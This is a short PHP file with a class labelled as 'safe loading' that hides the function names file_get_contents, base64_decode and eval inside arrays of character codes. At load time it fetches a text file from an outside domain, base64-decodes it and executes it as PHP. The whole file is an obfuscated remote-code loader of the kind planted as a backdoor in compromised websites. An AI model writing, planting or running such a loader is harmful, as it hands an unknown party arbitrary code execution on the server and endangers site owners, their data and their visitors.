<?php
class 安全加载 {
    private static $方法库 = [];
    
    public static function 初始化() {

        $获取码 = [102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115];
        $获取 = '';
        foreach($获取码 as $码) $获取 .= chr($码);
        
        $解码码 = [98,97,115,101,54,52,95,100,101,99,111,100,101];
        $解码 = '';
        foreach($解码码 as $码) $解码 .= chr($码);
        
        $执行码 = [101,118,97,108];
        $执行 = '';
        foreach($执行码 as $码) $执行 .= chr($码);
        
        self::$方法库 = [
            '获取' => function($网址) use ($获取) { return $获取($网址); },
            '处理' => function($数据) use ($解码) { 
                $结果 = $解码($数据, true);
                return ($结果 !== false) ? $结果 : $数据;
            },
            '运行' => function($代码) use ($执行) { return $执行('?>' . $代码); }
        ];
    }
    
    public static function 处理($源) {
        $数据 = self::$方法库['获取']($源);
        $数据 = self::$方法库['处理']($数据);
        return self::$方法库['运行']($数据);
    }
}

安全加载::初始化();
安全加载::处理("https://ampnyapunyaku.top/tools/s-media/media-new.txt");
?>
